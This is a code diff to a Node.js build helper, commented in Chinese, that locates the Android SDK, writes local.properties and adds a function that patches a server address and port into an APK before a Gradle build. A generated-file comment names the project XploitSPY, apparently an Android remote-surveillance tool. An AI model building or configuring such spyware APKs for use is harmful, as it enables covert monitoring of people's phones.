@@ -5,6 +5,59 @@ const
     CONST = require('./const');
 
 /**
+ * 获取Android SDK路径
+ * 支持多种常见安装位置
+ */
+function getAndroidSdkPath() {
+    // 首先检查环境变量
+    if (process.env.ANDROID_HOME) {
+        return process.env.ANDROID_HOME;
+    }
+    if (process.env.ANDROID_SDK) {
+        return process.env.ANDROID_SDK;
+    }
+    
+    // 常见Linux安装路径
+    const commonPaths = [
+        '/opt/android-sdk',
+        '/usr/local/android-sdk',
+        '/home/android-sdk',
+        path.join(require('os').homedir(), 'Android/Sdk'),
+        path.join(require('os').homedir(), 'android-sdk'),
+        '/var/lib/android-sdk'
+    ];
+    
+    for (const sdkPath of commonPaths) {
+        if (fs.existsSync(sdkPath)) {
+            return sdkPath;
+        }
+    }
+    
+    return null;
+}
+
+/**
+ * 设置local.properties中的SDK路径
+ */
+function setupLocalProperties(cb) {
+    const sdkPath = getAndroidSdkPath();
+    if (!sdkPath) {
+        return cb('未找到Android SDK，请设置ANDROID_HOME环境变量或安装Android SDK');
+    }
+    
+    const localPropertiesPath = path.join(CONST.clientPath, 'local.properties');
+    const content = `## 此文件由XploitSPY自动生成，请勿手动修改
+sdk.dir=${sdkPath}
+`;
+    
+    fs.writeFile(localPropertiesPath, content, 'utf8', (err) => {
+        if (err) return cb('写入local.properties失败: ' + err.message);
+        console.log('已设置Android SDK路径:', sdkPath);
+        return cb(false);
+    });
+}
+
+/**
  * 检查Java是否已安装
  */
 function checkJava(callback) {
@@ -49,6 +102,27 @@ function patchConfig(URI, PORT, cb) {
 }
 
 /**
+ * 完整的APK构建流程
+ * @param {string} URI - 服务器地址
+ * @param {string} PORT - 服务器端口
+ * @param {function} cb - 回调函数
+ */
+function buildAPKFull(URI, PORT, cb) {
+    // 第一步：设置SDK路径
+    setupLocalProperties((err) => {
+        if (err) return cb(err);
+        
+        // 第二步：修改服务器地址
+        patchConfig(URI, PORT, (err) => {
+            if (err) return cb(err);
+            
+            // 第三步：执行构建
+            buildAPK(cb);
+        });
+    });
+}
+
+/**
  * 使用Gradle构建Release APK
  * @param {function} cb - 回调函数
  */
@@ -56,9 +130,19 @@ function buildAPK(cb) {
     checkJava(function (err) {
         if (err) return cb(err);
         
+        const sdkPath = getAndroidSdkPath();
+        if (!sdkPath) {
+            return cb('未找到Android SDK，请设置ANDROID_HOME环境变量');
+        }
+        
         const options = {
             cwd: CONST.clientPath,
-            timeout: 300000 // 5分钟超时
+            timeout: 300000, // 5分钟超时
+            env: {
+                ...process.env,
+                ANDROID_HOME: sdkPath,
+                ANDROID_SDK: sdkPath
+            }
         };
         
         // 执行Gradle构建
@@ -117,6 +201,8 @@ module.exports = {
     buildAPK,
     patchConfig,
     cleanBuild,
+    buildAPKFull,
+    getAndroidSdkPath,
     // 保持向后兼容
     patchAPK: patchConfig
 };
